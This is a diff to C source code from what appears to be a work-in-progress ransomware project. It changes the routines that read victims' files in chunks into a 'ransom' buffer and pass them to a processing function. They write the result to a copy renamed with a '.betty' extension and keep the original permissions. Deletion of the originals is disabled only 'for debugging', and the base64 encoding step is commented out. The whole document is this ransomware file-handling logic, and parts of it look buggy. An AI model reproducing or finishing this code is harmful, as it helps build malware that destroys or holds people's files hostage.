@@ -11,37 +11,45 @@
   * @fxn: pointer to function to enact on lines
   * Return: number of bytes read
  **/
-char *read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *ransom))
+size_t read_file(const char *filepath, ransom_t *ransom, char *(*fxn)(char *, ransom_t *))
 {
-	/*
-	int read = 0;
-	*/
-	size_t bytes_read = 0;
+	size_t bytes_read;
 	FILE *fd = NULL;
-	char *buf = NULL;
+	off_t file_offset = ransom->target_file_buf->file_offset;
+	struct stat file_info;
 
 	if (!filepath || !ransom)
 		return(0);
+
+	lstat(filepath, &file_info);
+	ransom->target_file_buf->file_info = file_info;
 	fd = fopen(filepath, "rb");
-	fseek(fd, 0, SEEK_END);
-	bytes_read = ftell(fd);
-printf("filesize: %d\n", (int)bytes_read);
-	if(bytes_read == 0)
+	fseek(fd, file_offset, SEEK_SET);
+	if(file_info.st_size == 0)
 	{
 		fclose(fd);
 		fprintf(stderr, "File is empty\n");
 		return(0);
 	}
-	rewind(fd);
-	buf = (char *)my_calloc((bytes_read + 1) * sizeof(char), sizeof(char));
-	fread(buf, bytes_read, sizeof(char), fd);
-	buf[bytes_read] = '\0';
-printf("orig: %s\n", buf);
+	if (file_info.st_size > BUFSIZE * 4)
+		bytes_read = BUFSIZE * 4;
+	else
+		bytes_read = (size_t)file_info.st_size;
+	ransom->target_file_buf->bytes_read = bytes_read;
+	ransom->target_file_buf->file_offset += bytes_read;
+	fread((char *)ransom->target_file_buf->buf, bytes_read, sizeof(char), fd);
+
+	/* DEBUGGING BLOCK */
+ransom->target_file_buf->buf[ransom->target_file_buf->file_offset] = '\0';
+	/* END DEBUGGING BLOCK */
+
 	if(fxn)
-		fxn(buf, ransom);
+		fxn(ransom->target_file_buf->buf, ransom);
 	fclose(fd);
+	/* Disabled for debugging
 	unlink(filepath);
-	return (buf);
+	*/
+	return (bytes_read);
 }
 
 /**
@@ -50,43 +58,40 @@ printf("orig: %s\n", buf);
   * @buffer: buffer to write into the file
   * Return: number of bytes read
  **/
-size_t write_file(node_t *node, char *buffer)
+char *write_file(char *buffer, ransom_t *ransom)
 {
-	unsigned int new_ext_len = 0;
+	unsigned int new_BUFSIZE = BUFSIZE;
+	size_t new_ext_len = 0;
+	size_t filepath_len = 0;
 	size_t buf_size = 0;
 	size_t bytes_written = 0;
 	char *new_ext = ".betty";
-	char *encrypt_buf = NULL;
+	char *filepath = NULL;
 	FILE *fd = NULL;
-	/*
-	struct stat file_info;
 
-	stat(node->str, &file_info);
-	*/
+	filepath = ransom->target_file_buf->filepath;
 	new_ext_len = my_strlen(new_ext);
-	node->str = recalloc(node->str, node->len, node->len + new_ext_len + 1);
-	my_strncat(node->str, new_ext, node->len, new_ext_len);
+	filepath_len = my_strlen(filepath);
+	buf_size = ransom->target_file_buf->bytes_read;
+	if(filepath_len > BUFSIZE)
+	{
+		new_BUFSIZE *= 2;
+		filepath = recalloc(filepath, BUFSIZE, new_BUFSIZE);
+	}
+	my_strncat(filepath, new_ext, filepath_len, new_ext_len);
 	/* Open FD */
-	fd = fopen(node->str, "wb+");
-
-	buf_size = my_strlen(buffer);
+	fd = fopen(filepath, "wb+");
 /* TODO: base64encode function causes massive memory leaks */
-	encrypt_buf = base64encode((const void *)buffer, buf_size);
-	/**
-	  * Print for debugging
-	  * printf("ENCODED:\n\n%s\n", encrypt_buf);
-	  * getchar();
-	 **/
-
-	if ((bytes_written = fwrite((const char *)encrypt_buf, buf_size, sizeof(char), fd)) < 1)
+	/*
+	encrypt_buf = base64encode((const void *)ransom_buf, buf_size);
+	*/
+	if ((bytes_written = fwrite(buffer, buf_size, sizeof(char), fd)) < 1)
 		fprintf(stderr, "No bytes written\n");
-
+	/*
 	free(encrypt_buf);
+	*/
 
 	fclose(fd);
-	/* Close FD */
-	/*
-	chmod(node->str, file_info.st_mode);
-	*/
-	return(bytes_written);
+	chmod(filepath, ransom->target_file_buf->file_info.st_mode);
+	return(buffer);
 }
